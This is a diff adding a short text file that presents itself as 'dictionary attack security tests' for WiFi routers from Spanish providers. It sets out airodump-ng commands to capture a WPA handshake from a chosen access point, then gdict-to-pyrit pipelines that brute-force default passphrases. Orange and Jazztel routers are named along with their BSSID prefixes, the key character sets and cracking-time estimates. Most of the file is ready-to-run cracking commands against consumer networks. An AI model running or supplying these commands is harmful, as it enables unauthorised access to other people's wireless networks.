@@ -1,0 +1,40 @@
+dict_attacks_es.txt
+===
+
+Dictionary attack security tests for Spanish providers.
+
+Method:
+
+1) Get data from specific AP (WiFi Access Point)
+
+	airodump-ng mon0 -c 6 -d 12:34:56:78:9A:BC -w target1
+
+2) Once you have the WPA handshake, you can check if is vulnerable:
+
+	gdict 10 0123456789 | pyrit -r target1*.cap -i - -b 12:34:56:78:9A:BC attack_passthrough
+
+
+Real world examples:
+
+
+ESSID: Orange-XXXX - Information from: http://lampiweb.com/foro/index.php?topic=9913.0
+
+	BSSIDs: 9C:80:DF 1C:C6:3C 50:7E:5D 74:31:70 84:9C:A6 88:03:55
+
+	gdict 8 4A59E3F6C27 | pyrit -r captured_data.cap -i - -b xx:xx:xx:xx:xx:xx attack_passthrough
+
+	Observations: requires a bit more than one hour running at 50000 PKMs (11^8 passphrases)
+
+ESSID: Jazztel_XX - Information from: http://lampiweb.com/foro/index.php/topic,10205.0
+
+	BSSIDs: C8:D1:5E 4C:ED:DE 28:5F:DB B4:74:9F E8:39:DF
+
+	gdict 8 4FMJA6KRD7QU9HVPECBTGNXW8Y3 | pyrit -r captured_data.cap -i - -b xx:xx:xx:xx:xx:xx attack_passthrough
+
+	Observations: requires weeks/months at 50000 PKMs (27^8 passphrases))
+
+	As heuristic, you can try avoid passphrases with repeated characters (20-30% faster):
+
+	gdict -nc 8 4FMJA6KRD7QU9HVPECBTGNXW8Y3 | pyrit -r captured_data.cap -i - -b xx:xx:xx:xx:xx:xx attack_passthrough
+
+
